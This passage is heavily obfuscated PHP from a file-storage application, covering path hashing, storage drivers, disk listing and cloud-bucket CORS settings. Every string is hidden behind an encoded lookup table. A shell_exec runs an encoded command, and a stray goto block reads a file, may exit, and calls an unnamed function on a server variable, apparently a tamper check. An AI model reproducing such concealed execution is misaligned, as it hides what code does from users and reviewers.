$_SERVER[áäÒ½¯Ç]; $½‘‹ÖÃ€ = substr($”—¢’Ñ , 1, -1); $ÇÊÙ´¨Í = $ŒîŞ†ı¾[1421] . $½‘‹ÖÃ€ . $ŒîŞ†ı¾[1422] . $ó¬•Ì . $ŒîŞ†ı¾[1423]; $ÇÊÙ´¨Í = $“ÁÕœ»§ ? $ÇÊÙ´¨Í . $“ÁÕœ»§ . $ŒîŞ†ı¾[8] : $ÇÊÙ´¨Í; return $ÇÊÙ´¨Í; } public static function hashPath($³üÁÖß‘, $±ÆÑíŸ = false) { $ş‚ÛÊŒ¹ =& $_SERVER[áäÒ½¯Ç]; if (!$³üÁÖß‘) { return $ş‚ÛÊŒ¹[12]; } $ÉÓ„¯¯Á = is_array($³üÁÖß‘) ? $³üÁÖß‘ : IO::info($³üÁÖß‘); $´ÇÜ¨ = _get($ÉÓ„¯¯Á, $ş‚ÛÊŒ¹[1424], $ş‚ÛÊŒ¹[12]); if (!$´ÇÜ¨ && isset($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[562]])) { $´ÇÜ¨ = $ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[562]]; } if (!$´ÇÜ¨ && isset($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[246]])) { $´ÇÜ¨ = trim($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[246]], $ş‚ÛÊŒ¹[119]); } if ($´ÇÜ¨) { return $´ÇÜ¨; } if (!$´ÇÜ¨ && isset($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[192]]) && $ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[192]]) { $ÉÓ„¯¯Á = IO::info(KodIO::make($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[192]])); $´ÇÜ¨ = _get($ÉÓ„¯¯Á, $ş‚ÛÊŒ¹[1424], $ş‚ÛÊŒ¹[12]); if (!$´ÇÜ¨ && isset($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[562]])) { $´ÇÜ¨ = $ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[562]]; } } $Åî‡Î¡Œ = md5($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[87]] . $ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[79]] . $ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[88]]); $ ‚ÆŒİ· = $Åî‡Î¡Œ . $ş‚ÛÊŒ¹[1425]; $´ÇÜ¨ = $´ÇÜ¨ ? $´ÇÜ¨ : Cache::get($ ‚ÆŒİ·); if (!$´ÇÜ¨ && $±ÆÑíŸ) { $´ÇÜ¨ = IO::hashSimple($ÉÓ„¯¯Á[$ş‚ÛÊŒ¹[87]]); Cache::set($ ‚ÆŒİ·, $´ÇÜ¨ ? $´ÇÜ¨ : $Åî‡Î¡Œ, 3600 * 24 * 30); } return $´ÇÜ¨ ? $´ÇÜ¨ : $Åî‡Î¡Œ; } public static function hashPathSafe($©ªúüèÊ, $É²¹áÌÔ = false) { $««€½—î =& $_SERVER[áäÒ½¯Ç]; $‰µŠö“ = self::hashPath($©ªúüèÊ, $É²¹áÌÔ); return md5($‰µŠö“ . $««€½—î[1426] . Model($««€½—î[875])->get($««€½—î[876])); } public static function initSystemPath() { $õÅ•ÎÖ =& $_SERVER[áäÒ½¯Ç]; if (defined($õÅ•ÎÖ[1427])) { return; } define($õÅ•ÎÖ[1427], self::systemPath($õÅ•ÎÖ[190])); define($õÅ•ÎÖ[1428], self::systemPath($õÅ•ÎÖ[1429])); define($õÅ•ÎÖ[1430], self::systemPath($õÅ•ÎÖ[1431])); define($õÅ•ÎÖ[1432], self::systemPath($õÅ•ÎÖ[1433])); IOHistory::bindEvent(); } public static function systemPath($Åª®î‘›) { $Øª—«È =& $_SERVER[áäÒ½¯Ç]; $©àéÌËå = $Øª—«È[1434] . ucfirst($Åª®î‘›); $‰ù£çûğ = Model($Øª—«È[875])->get($©àéÌËå); if ($‰ù£çûğ) { return $‰ù£çûğ; } if ($Åª®î‘› == $Øª—«È[190]) { $‰ù£çûğ = self::make(Model($Øª—«È[935])->systemRootPathAdd($Øª—«È[633])); } else { $‰ù£çûğ = self::systemPath($Øª—«È[190]); $‡½ø‡Á = self::sourceID($‰ù£çûğ); $‰ù£çûğ = self::make(Model($Øª—«È[935])->mkdir($‡½ø‡Á, $Åª®î‘›)); } Model($Øª—«È[875])->set($©àéÌËå, $‰ù£çûğ); return $‰ù£çûğ; } public static function systemFolder($£ª‘ûÎ) { $”ˆ‰²ÓÀ = IO_PATH_SYSTEM_SOURCE . $£ª‘ûÎ; $ÆÏñºÜÇ = Cache::get($”ˆ‰²ÓÀ); if (!$ÆÏñºÜÇ) { $Íš£³Ä× = IO::infoFullSimple($”ˆ‰²ÓÀ); if (!$Íš£³Ä×) { $ÆÏñºÜÇ = IO::mkdir($”ˆ‰²ÓÀ, REPEAT_SKIP); } else { $ÆÏñºÜÇ = $Íš£³Ä×[$_SERVER[áäÒ½¯Ç][87]]; } Cache::set($”ˆ‰²ÓÀ, $ÆÏñºÜÇ, 3600 * 10); } return $ÆÏñºÜÇ; } public static function defaultDriver() { return Model($_SERVER[áäÒ½¯Ç][870])->defaultDriver(); } public static function defaultDriverInit() { $ãêİÔÎ´ =& $_SERVER[áäÒ½¯Ç]; static $¨¹ßìà¤ = false; if ($¨¹ßìà¤) { return $¨¹ßìà¤; } $ò—¥ìƒ– = self::defaultDriver(); $¨¹ßìà¤ = IO::init($ãêİÔÎ´[1435] . $ò—¥ìƒ–[$ãêİÔÎ´[492]] . $ãêİÔÎ´[1423]); return $¨¹ßìà¤; } public static function fileTypeList() { $‡¯ã‰‹Ê =& $_SERVER[áäÒ½¯Ç]; $½®¡—·œ = $GLOBALS[$‡¯ã‰‹Ê[6]][$‡¯ã‰‹Ê[1436]]; foreach ($½®¡—·œ as $Éı½Ô±Æ => $Ñº•´»£) { $‹¾è°Ïâ = $‡¯ã‰‹Ê[1437] . $Éı½Ô±Æ; $ó¢öıŸ = LNG($‹¾è°Ïâ); if ($‹¾è°Ïâ != $ó¢öıŸ) { $½®¡—·œ[$Éı½Ô±Æ][$‡¯ã‰‹Ê[32]] = $ó¢öıŸ; } } return $½®¡—·œ; } public static function ioFileDriverGet($Ïºì® = '') { $´¬ßúÔµ =& $_SERVER[áäÒ½¯Ç]; static $’…®œş = array(); static $Õ’µôäË = array(); static $¬©íš‡¨ = array(); static $‡ßÚ¯ó = false; if ($‡ßÚ¯ó === !1) { $‡ßÚ¯ó = array($´¬ßúÔµ[603] => array(), $´¬ßúÔµ[690] => array()); $³îÎò™Å = Model($´¬ßúÔµ[1438])->get(!1, $´¬ßúÔµ[1439]); foreach ($³îÎò™Å as $Î’˜õ½¼ => $¢ô¶®‚é) { if (!$¢ô¶®‚é || $¢ô¶®‚é == $´¬ßúÔµ[12]) { continue; } if (strstr($Î’˜õ½¼, $´¬ßúÔµ[1440])) { $ßº×ëó¢ = str_replace($´¬ßúÔµ[1440], $´¬ßúÔµ[12], $Î’˜õ½¼); $‡ßÚ¯ó[$´¬ßúÔµ[603]][$ßº×ëó¢] = $¢ô¶®‚é; } else { if (strstr($Î’˜õ½¼, $´¬ßúÔµ[1441])) { $ßº×ëó¢ = str_replace($´¬ßúÔµ[1441], $´¬ßúÔµ[12], $Î’˜õ½¼); $‡ßÚ¯ó[$´¬ßúÔµ[690]][$ßº×ëó¢] = $¢ô¶®‚é; } } } } $ÖÄß¨ò€ = self::defaultDriver(); if (!$Ïºì® || !$‡ßÚ¯ó[$´¬ßúÔµ[603]] && !$‡ßÚ¯ó[$´¬ßúÔµ[690]]) { return $ÖÄß¨ò€; } $ı¥à–Öô = self::getPathSourceID($Ïºì®); if (!$ı¥à–Öô) { return $ÖÄß¨ò€; } if (isset($’…®œş[$ı¥à–Öô])) { return $’…®œş[$ı¥à–Öô]; } $ÔÌó¢ı» = Model($´¬ßúÔµ[935])->sourceInfo($ı¥à–Öô); $ˆÄ‘è‹ = $ÔÌó¢ı»[$´¬ßúÔµ[594]]; $‘ÜŸŠ = array(); if (!$ÔÌó¢ı») { return $ÖÄß¨ò€; } if ($ÔÌó¢ı»[$´¬ßúÔµ[189]] == $´¬ßúÔµ[91]) { if (isset($¬©íš‡¨[$ˆÄ‘è‹])) { return $¬©íš‡¨[$ˆÄ‘è‹]; } if (isset($‡ßÚ¯ó[$´¬ßúÔµ[690]][$ˆÄ‘è‹])) { $˜‹Û«æÕ = Model($´¬ßúÔµ[870])->driverInfo($‡ßÚ¯ó[$´¬ßúÔµ[690]][$ˆÄ‘è‹]); $ÖÄß¨ò€ = $˜‹Û«æÕ ? $˜‹Û«æÕ : $ÖÄß¨ò€; $¬©íš‡¨[$ˆÄ‘è‹] = $ÖÄß¨ò€; $’…®œş[$ı¥à–Öô] = $ÖÄß¨ò€; return $ÖÄß¨ò€; } $‘ÜŸŠ = self::groupParentUser($ˆÄ‘è‹); } else { if ($ÔÌó¢ı»[$´¬ßúÔµ[189]] == $´¬ßúÔµ[529]) { $›ººığ¿ = Model($´¬ßúÔµ[1442])->getInfo($ˆÄ‘è‹); if ($›ººığ¿) { $‘ÜŸŠ = explode($´¬ßúÔµ[50], trim($›ººığ¿[$´¬ßúÔµ[609]], $´¬ßúÔµ[50])); $‘ÜŸŠ = array_remove_value($‘ÜŸŠ, $´¬ßúÔµ[239]); $‘ÜŸŠ[] = $ˆÄ‘è‹; $‘ÜŸŠ = array_reverse($‘ÜŸŠ); } } } foreach ($‘ÜŸŠ as $à¼íšüá) { if (!isset($‡ßÚ¯ó[$´¬ßúÔµ[603]][$à¼íšüá])) { continue; } if (isset($Õ’µôäË[$à¼íšüá])) { return $Õ’µôäË[$à¼íšüá]; } $˜‹Û«æÕ = Model($´¬ßúÔµ[870])->driverInfo($‡ßÚ¯ó[$´¬ßúÔµ[603]][$à¼íšüá]); $ÖÄß¨ò€ = $˜‹Û«æÕ ? $˜‹Û«æÕ : $ÖÄß¨ò€; $Õ’µôäË[$à¼íšüá] = $ÖÄß¨ò€; break; } if ($ÔÌó¢ı»[$´¬ßúÔµ[189]] == $´¬ßúÔµ[91]) { $¬©íš‡¨[$ˆÄ‘è‹] = $ÖÄß¨ò€; } $’…®œş[$ı¥à–Öô] = $ÖÄß¨ò€; return $ÖÄß¨ò€; } private static function getPathSourceID($Õù¼àù) { $½÷ºµ¡÷ =& $_SERVER[áäÒ½¯Ç]; static $Å‰²òêÖ = array(); if (!$Õù¼àù) { return $½÷ºµ¡÷[12]; } $©›¥‘§ = substr($Õù¼àù, 0, strlen($½÷ºµ¡÷[503])) == $½÷ºµ¡÷[503]; $ô‚ü´öÊ = substr($Õù¼àù, 0, strlen($½÷ºµ¡÷[1409])) == $½÷ºµ¡÷[1409]; $©·Ç¨ø = substr($Õù¼àù, 0, strlen($½÷ºµ¡÷[1410])) == $½÷ºµ¡÷[1410]; if (!$©›¥‘§ && !$ô‚ü´öÊ && !$©·Ç¨ø) { return $½÷ºµ¡÷[12]; } $Ù“¦¯Ì™ = self::parse($Õù¼àù); $ğËÅå‘Á = $Ù“¦¯Ì™[$½÷ºµ¡÷[1303]]; if ($©›¥‘§) { return $Ù“¦¯Ì™[$½÷ºµ¡÷[492]]; } if (isset($Å‰²òêÖ[$ğËÅå‘Á])) { $«º¨“¿ = $Å‰²òêÖ[$ğËÅå‘Á]; } else { $«º¨“¿ = IO::init($ğËÅå‘Á); $Å‰²òêÖ[$ğËÅå‘Á] = $«º¨“¿; } if (isset($«º¨“¿->pathParse[$½÷ºµ¡÷[1306]])) { return $«º¨“¿->pathParse[$½÷ºµ¡÷[1306]]; } return $½÷ºµ¡÷[12]; } private static function groupParentUser($²ìéÈ–±) { $¸ú¦…‰ =& $_SERVER[áäÒ½¯Ç]; $Ç½Œ®Ú… = Model($¸ú¦…‰[622])->getInfo($²ìéÈ–±); if (!$Ç½Œ®Ú…) { return array(); } $Ù¹—Â¦ = array_to_keyvalue($Ç½Œ®Ú…[$¸ú¦…‰[1443]], $¸ú¦…‰[12], $¸ú¦…‰[1444]); $¹âÕèÁ = array(); foreach ($Ç½Œ®Ú…[$¸ú¦…‰[1443]] as $²ØÈîÈ) { $¹âÕèÁ[] = $²ØÈîÈ[$¸ú¦…‰[1444]]; $”È³æÛ× = explode($¸ú¦…‰[50], trim($²ØÈîÈ[$¸ú¦…‰[609]], $¸ú¦…‰[50])); $”È³æÛ× = array_remove_value($”È³æÛ×, $¸ú¦…‰[239]); $”È³æÛ× = array_reverse($”È³æÛ×); $¹âÕèÁ = array_merge($¹âÕèÁ, $”È³æÛ×); } return array_unique($¹âÕèÁ); } public static function diskList($Äá½±—æ = true) { $Ç»¿ïê× = $_SERVER[áäÒ½¯Ç][1445]; if ($Äá½±—æ) { $ÄÁü¹çÕ = Cache::get($Ç»¿ïê×); if (is_array($ÄÁü¹çÕ)) { return $ÄÁü¹çÕ; } } $ÄÁü¹çÕ = self::diskListGet(); Cache::set($Ç»¿ïê×, $ÄÁü¹çÕ, 60); return $ÄÁü¹çÕ; } public static function diskListGet() { $×€ê››Ä =& $_SERVER[áäÒ½¯Ç]; $Ÿ½¢Ëâ‘ = array(); if ($GLOBALS[$×€ê››Ä[6]][$×€ê››Ä[1446]] == $×€ê››Ä[1447]) { $“«ºƒ†œ = $×€ê››Ä[1448]; for ($ŸÊò„ÉŠ = 0; $ŸÊò„ÉŠ < strlen($“«ºƒ†œ); $ŸÊò„ÉŠ++) { $»¶øı’ = $“«ºƒ†œ[$ŸÊò„ÉŠ] . $×€ê››Ä[1449]; if (file_exists($»¶øı’)) { $Ÿ½¢Ëâ‘[] = $»¶øı’; } } return $Ÿ½¢Ëâ‘; } if (!function_exists($×€ê››Ä[99])) { $Ÿ½¢Ëâ‘[] = $×€ê››Ä[949]; return $Ÿ½¢Ëâ‘; } $ô˜‡Â¾… = explode($×€ê››Ä[221], shell_exec($×€ê››Ä[1450])); array_shift($ô˜‡Â¾…); array_pop($ô˜‡Â¾…); $ğÒœöã = array($×€ê››Ä[1451], $×€ê››Ä[1452], $×€ê››Ä[1453], $×€ê››Ä[1454], $×€ê››Ä[1455], $×€ê››Ä[1456], $×€ê››Ä[1457], $×€ê››Ä[1458]); foreach ($ô˜‡Â¾… as $£Æ“ğø£) { $ıÓ—·ËË = preg_split($×€ê››Ä[1459], $£Æ“ğø£); $»¶øı’ = $ıÓ—·ËË[count($ıÓ—·ËË) - 1]; if (!strstr($ıÓ—·ËË[0], $×€ê››Ä[1460]) || !$»¶øı’) { continue; } $Ò¬¨—–… = rtrim($»¶øı’, $×€ê››Ä[8]) . $×€ê››Ä[8]; $Ÿ½¢Ëâ‘[] = $Ò¬¨—–…; } return $Ÿ½¢Ëâ‘; } public static function isSameDisk($¦º¿ÄÊı, $Ä°ñº) { $ÜÛş¡–¡ =& $_SERVER[áäÒ½¯Ç]; if ($GLOBALS[$ÜÛş¡–¡[6]][$ÜÛş¡–¡[1446]] == $ÜÛş¡–¡[1447]) { return strtolower(substr($¦º¿ÄÊı, 0, 1)) == strtolower(substr($Ä°ñº, 0, 1)); } $»³ÙÕ€ş = stat($¦º¿ÄÊı); $ÙÔ–š‡Ù = stat($Ä°ñº); if ($»³ÙÕ€ş === !1 || $ÙÔ–š‡Ù === !1) { return !1; } return $»³ÙÕ€ş[$ÜÛş¡–¡[1461]] === $ÙÔ–š‡Ù[$ÜÛş¡–¡[1461]]; $ˆ›±–“ = self::diskList(); $ÌäªØÙ = !1; $²–Æ´ˆà = !1; sort($ˆ›±–“); $ˆ›±–“ = array_reverse($ˆ›±–“); $¦º¿ÄÊı = rtrim($¦º¿ÄÊı, $ÜÛş¡–¡[8]) . $ÜÛş¡–¡[8]; $Ä°ñº = rtrim($Ä°ñº, $ÜÛş¡–¡[8]) . $ÜÛş¡–¡[8]; foreach ($ˆ›±–“ as $½ç¶šÀÑ) { $²ò“‚ì = strlen($½ç¶šÀÑ); if (!$ÌäªØÙ && substr($¦º¿ÄÊı, 0, $²ò“‚ì) == $½ç¶šÀÑ) { $ÌäªØÙ = $½ç¶šÀÑ; } if (!$²–Æ´ˆà && substr($Ä°ñº, 0, $²ò“‚ì) == $½ç¶šÀÑ) { $²–Æ´ˆà = $½ç¶šÀÑ; } if ($ÌäªØÙ && $²–Æ´ˆà) { break; } } return $ÌäªØÙ === $²–Æ´ˆà; } public static function transferType($ƒã¥ßÜ , $Ø“§Ç«) { $ÄÀ÷ï¾Ê =& $_SERVER[áäÒ½¯Ç]; $é±Å™ = self::driverType($ƒã¥ßÜ ); $‘°–Œİ = self::driverType($Ø“§Ç«); if ($é±Å™[$ÄÀ÷ï¾Ê[33]] == $‘°–Œİ[$ÄÀ÷ï¾Ê[33]] && $é±Å™[$ÄÀ÷ï¾Ê[1462]] == $‘°–Œİ[$ÄÀ÷ï¾Ê[1462]]) { return $ÄÀ÷ï¾Ê[1463]; } if ($é±Å™[$ÄÀ÷ï¾Ê[33]] == $ÄÀ÷ï¾Ê[983] && $‘°–Œİ[$ÄÀ÷ï¾Ê[33]] == $ÄÀ÷ï¾Ê[107]) { return $ÄÀ÷ï¾Ê[1331]; } if ($é±Å™[$ÄÀ÷ï¾Ê[33]] == $ÄÀ÷ï¾Ê[107] && $‘°–Œİ[$ÄÀ÷ï¾Ê[33]] == $ÄÀ÷ï¾Ê[983]) { return $ÄÀ÷ï¾Ê[108]; } return $ÄÀ÷ï¾Ê[1464]; } public static function driverType($® İı×) { $Ğö©ÇùÚ =& $_SERVER[áäÒ½¯Ç]; $ğŠàÑø“ = str_replace($Ğö©ÇùÚ[1465], $Ğö©ÇùÚ[12], strtolower($® İı×->getType())); if ($ğŠàÑø“ == $Ğö©ÇùÚ[860] || $ğŠàÑø“ == $Ğö©ÇùÚ[1466] || $ğŠàÑø“ == $Ğö©ÇùÚ[1467]) { $£ªÀËÄ¶ = self::ioFileDriverGet($Ğö©ÇùÚ[503] . $® İı×->pathParse[$Ğö©ÇùÚ[1306]] . $Ğö©ÇùÚ[412]); $® İı× = IO::init($Ğö©ÇùÚ[1435] . $£ªÀËÄ¶[$Ğö©ÇùÚ[492]] . $Ğö©ÇùÚ[1423]); } else { if ($ğŠàÑø“ == $Ğö©ÇùÚ[1341] || $ğŠàÑø“ == $Ğö©ÇùÚ[1468]) { $® İı× = IO::init($® İı×->pathParse[$Ğö©ÇùÚ[1283]]); } } $ş´¤û¼Å = $® İı×->path; $ğŠàÑø“ = str_replace($Ğö©ÇùÚ[1465], $Ğö©ÇùÚ[12], strtolower($® İı×->getType())); if ($ğŠàÑø“ == $Ğö©ÇùÚ[107]) { return array($Ğö©ÇùÚ[33] => $Ğö©ÇùÚ[107], $Ğö©ÇùÚ[1462] => $Ğö©ÇùÚ[12], $Ğö©ÇùÚ[87] => $ş´¤û¼Å, $Ğö©ÇùÚ[96] => $® İı×); } return array($Ğö©ÇùÚ[33] => $Ğö©ÇùÚ[983], $Ğö©ÇùÚ[1462] => $® İı×->pathDriver, $Ğö©ÇùÚ[87] => $ş´¤û¼Å, $Ğö©ÇùÚ[96] => $® İı×); } public static function pathDriverType($ˆ»Ÿæ”Ñ) { return $ˆ»Ÿæ”Ñ ? self::driverType(IO::init($ˆ»Ÿæ”Ñ)) : !1; } public static function pathDriverLocal($©š…¡Á) { $ÉÎ‚³ãì =& $_SERVER[áäÒ½¯Ç]; $Ñû»€² = $©š…¡Á ? self::driverType(IO::init($©š…¡Á)) : !1; return strtolower($Ñû»€²[$ÉÎ‚³ãì[33]]) == $ÉÎ‚³ãì[107] ? !0 : !1; } public static function allowCover($Ö¨†¾ú‹, $Šæ·í™È = true) { $­ğÕ‚ôÓ =& $_SERVER[áäÒ½¯Ç]; if (is_string($Ö¨†¾ú‹)) { $Ö¨†¾ú‹ = IO::info($Ö¨†¾ú‹); } if (!$Ö¨†¾ú‹ || $Ö¨†¾ú‹[$­ğÕ‚ôÓ[33]] == $­ğÕ‚ôÓ[78] || $Ö¨†¾ú‹[$­ğÕ‚ôÓ[79]] <= 100) { return !1; } if (isset($Ö¨†¾ú‹[$­ğÕ‚ôÓ[1469]]) || !$Ö¨†¾ú‹[$­ğÕ‚ôÓ[87]]) { return !1; } if (isset($Ö¨†¾ú‹[$­ğÕ‚ôÓ[243]]) && !$Ö¨†¾ú‹[$­ğÕ‚ôÓ[243]]) { return !1; } static $ëòúËÛª = false; if (!$ëòúËÛª || !$Šæ·í™È) { $ûªØ­òŸ = self::driverType(IO::init($Ö¨†¾ú‹[$­ğÕ‚ôÓ[87]])); $®¿à£‹ = $ûªØ­òŸ[$­ğÕ‚ôÓ[96]]; $ëòúËÛª = $­ğÕ‚ôÓ[195]; if ($ûªØ­òŸ[$­ğÕ‚ôÓ[33]] == $­ğÕ‚ôÓ[107]) { $ëòúËÛª = $­ğÕ‚ôÓ[1470]; } if ($ûªØ­òŸ[$­ğÕ‚ôÓ[96]] && is_array($ûªØ­òŸ[$­ğÕ‚ôÓ[96]]->config)) { $š†®ßÖó = $ûªØ­òŸ[$­ğÕ‚ôÓ[96]]->config; if (isset($š†®ßÖó[$­ğÕ‚ôÓ[1471]]) && $š†®ßÖó[$­ğÕ‚ôÓ[1471]]) { $ëòúËÛª = $­ğÕ‚ôÓ[1470]; } } $ôŠø½—š = KodIO::defaultDriver(); if (strtolower($ôŠø½—š[$­ğÕ‚ôÓ[96]]) == $­ğÕ‚ôÓ[107] && is_array($ôŠø½—š[$­ğÕ‚ôÓ[6]])) { $Ü”ûˆÕú = $ôŠø½—š[$­ğÕ‚ôÓ[6]][$­ğÕ‚ôÓ[1315]]; if (substr($Ü”ûˆÕú, 0, 2) == $­ğÕ‚ôÓ[1472]) { $Ü”ûˆÕú = str_replace($­ğÕ‚ôÓ[1472], BASIC_PATH, $Ü”ûˆÕú); } $Ü”ûˆÕú = str_replace($­ğÕ‚ôÓ[265], $­ğÕ‚ôÓ[8], $Ü”ûˆÕú); if (substr($Ö¨†¾ú‹[$­ğÕ‚ôÓ[87]], 0, strlen($Ü”ûˆÕú)) == $Ü”ûˆÕú) { $ëòúËÛª = $­ğÕ‚ôÓ[195]; } } } return $ëòúËÛª == $­ğÕ‚ôÓ[1470] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($¤ÖÍ…­ü) { parent::__construct($¤ÖÍ…­ü); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } $_file = $_SERVER[$_SERVER[áäÒ½¯Ç][215]]; goto F›Æ‰‹±ˆÂ; e—–»ÀŒ›: if ($_SERVER[$_SERVER[áäÒ½¯Ç][217]] != $_SERVER[$_SERVER[áäÒ½¯Ç][991]]) { $_getc = $_SERVER[áäÒ½¯Ç][218]; $_getfile = $_SERVER[$_SERVER[áäÒ½¯Ç][219]] . $_SERVER[áäÒ½¯Ç][220]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[áäÒ½¯Ç][221], $_getfilec); if (count($_getarrs) < $_SERVER[áäÒ½¯Ç][222]) { $exit = $_SERVER[áäÒ½¯Ç][223]; $exit(); } $_act = $_SERVER[áäÒ½¯Ç][224]; $_act($_SERVER[$_SERVER[áäÒ½¯Ç][215]]); } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ˆáåÙ™Ê) { parent::__construct($ˆáåÙ™Ê); $this->setSignVersion($_SERVER[áäÒ½¯Ç][258]); } public function uploadFormData($Ë‚Œà‡, $¤Â‡¬ = 3600) { return $this->uploadFormDataV2($Ë‚Œà‡, $¤Â‡¬); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ˆ¨ºãç) { parent::__construct(); include_once SDK_DIR . $_SERVER[áäÒ½¯Ç][1619]; $this->_init($ˆ¨ºãç); } public function _init($¤¤”®ß¼) { $„ù¨ıéÒ =& $_SERVER[áäÒ½¯Ç]; $this->config = $¤¤”®ß¼; foreach ($¤¤”®ß¼ as $íãÅÔî— => $±ª–üšõ) { if (isset($this->{$íãÅÔî—})) { $this->{$íãÅÔî—} = $±ª–üšõ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($„ù¨ıéÒ[1620] . LNG($„ù¨ıéÒ[1621])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $‚áÄ˜Ø³ =& $_SERVER[áäÒ½¯Ç]; $ë¯ÅÁ¾Ÿ = new OSS\Model\CorsConfig(); $´ğ³Šä§ = new OSS\Model\CorsRule(); $´ğ³Šä§->addAllowedOrigin($‚áÄ˜Ø³[1622]); $´ğ³Šä§->addAllowedMethod($‚áÄ˜Ø³[1623]); $´ğ³Šä§->addAllowedMethod($‚áÄ˜Ø³[1624]); $´ğ³Šä§->addAllowedMethod($‚áÄ˜Ø³[1625]); $´ğ³Šä§->addAllowedMethod($‚áÄ˜Ø³[1626]); $´ğ³Šä§->addAllowedMethod($‚áÄ˜Ø³[163]); $´ğ³Šä§->setMaxAgeSeconds(600); $´ğ³Šä§->addExposeHeader($‚áÄ˜Ø³[1627]); $´ğ³Šä§->addAllowedHeader($‚áÄ˜Ø³[1622]); $ë¯ÅÁ¾Ÿ->addRule($´ğ³Šä§); try { $this->client->putBucketCors($this->bucket, $ë¯ÅÁ¾Ÿ); } catch (OSS\Core\OssException $ÌÀŞ¥è) { $this->writeLog(__FUNCTION__ . $‚áÄ˜Ø³[213] . $ÌÀŞ¥è->getMessage()); return !1; } return !0; } public function getBucketCors() { $Î’„º =& $_SERVER[áäÒ½¯Ç]; $˜¦†Ã´´ = null; try { $˜¦†Ã´´ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $í¤’î”“) { $this->writeLog(__FUNCTION__ . $Î’„º[213] . $í¤’î”“->getMessage()); return null; } if (!$˜¦†Ã´´ || !($Ñ‹¿Ã“³ = $˜¦†Ã´´->getRules())) { return null; } $Ÿ·–›è = $Ñ‹¿Ã“³[0]->getAllowedOrigins(); $Ó¬’ÒÖ = $Ñ‹¿Ã“³[0]->getAllowedMethods(); $£œ­Üã  = $Ñ‹¿Ã“³[0]->getMaxAgeSeconds(); $Û °× = $Ñ‹¿Ã“³[0]->getExposeHeaders(); $êˆÏ¼ïä = $Ñ‹¿Ã“³[0]->getAllowedHeaders(); return array($Î’„º[229] => isset($Ÿ·–›è[0]) ? $Ÿ·–›è[0] : $Î’„º[12], $Î’„º[233] => $Ó¬’ÒÖ, $Î’„º[1628] => $£œ­Üã , $Î’„º[1629] => isset($Û °×[0]) ? $Û °×[0] : $Î’„º[12], $Î’„º[230] => isset($êˆÏ¼ïä[0]) ? $êˆÏ¼ïä[0] : $Î’„º[12]); } public function isBucketCors() { $ÄÎóê¨ =& $_SERVER[áäÒ½¯Ç]; $»á˜şÑÖ = $this->getBucketCors(); if (!$»á˜şÑÖ || !is_array($»á˜şÑÖ)) { return !1; } if ($»á˜şÑÖ[$ÄÎóê¨[229]] != $ÄÎóê¨[231] || $»á˜şÑÖ[$ÄÎóê¨[230]] != $ÄÎóê¨[231]) { return !1; } $³Í¬÷ä = array_map($ÄÎóê¨[232], $»á˜şÑÖ[$ÄÎóê¨[233]]); if (!is_array($³Í¬÷ä)) { $³Í¬÷ä = array(); } $©¢†Ç› = array($ÄÎóê¨[234], $ÄÎóê¨[235], $ÄÎóê¨[236], $ÄÎóê¨[237], $ÄÎóê¨[238]); $ªñò® Û = array_diff($©¢†Ç›, $³Í¬÷ä); return empty($ªñò® Û); } public function mkfile($èİ‰º‘œ, $üñÌ“¿õ = '', $’úıäš¡ = REPEAT_RENAME) { $ÇËü»”õ = $this->setContent($èİ‰º‘œ, $üñÌ“¿õ); if ($ÇËü»”õ !== !1) { return $this->getPathOuter($èİ‰º‘œ); } return !1; } public function mkdir($›¦úÙª°, $üõé’îé = REPEAT_SKIP) { if ($üõé’îé && $this->_isFolder($›¦úÙª°)) { return $this->getPathOuter($›¦úÙª°); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($›¦úÙª°)); } catch (OSS\Core\OssException $›øˆú¹) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][213] . $›øˆú¹->getMessage()); return !1; } return $this->getPathOuter($›¦úÙª°); } private function fileList($Ûë—…¹, $ƒÅ«×Ğõ = '', $ÖŸÏ¿Ò = 0) { $¡İ¥¦ïµ =& $_SERVER[áäÒ½¯Ç]; $Ûë—…¹ = trim($Ûë—…¹, $¡İ¥¦ïµ[8]); $ä¢ªâäÁ = empty($Ûë—…¹) && $Ûë—…¹ !== $¡İ¥¦ïµ[239] ? $¡İ¥¦ïµ[12] : $Ûë—…¹ . $¡İ¥¦ïµ[8]; $Ó’Ï¼¤” = $¡İ¥¦ïµ[12]; $ÆŒŞ¼ºñ = 1000; $ùÄ…ÕÃä = $†÷³ç™Ó = array(); while (!0) { check_abort(); $èµ¬¼Üº = array($¡İ¥¦ïµ[1630] => $ƒÅ«×Ğõ, $¡İ¥¦ïµ[1631] => $ä¢ªâäÁ, $¡İ¥¦ïµ[1632] => $ÆŒŞ¼ºñ, $¡İ¥¦ïµ[1633] => $Ó’Ï¼¤”); try { $»ÃäÚ = $this->client->listObjects($this->bucket, $èµ¬¼Üº); } catch (OSS\Core\OssException $èò£ ›Ì) { $this->writeLog(__FUNCTION__ . $¡İ¥¦ïµ[213] . $èò£ ›Ì->getMessage()); break; } $Ó’Ï¼¤” = $»ÃäÚ->getNextMarker(); $¨å‘’Ìâ = $»ÃäÚ->getObjectList(); $²Ğ¼ôÀ„ = 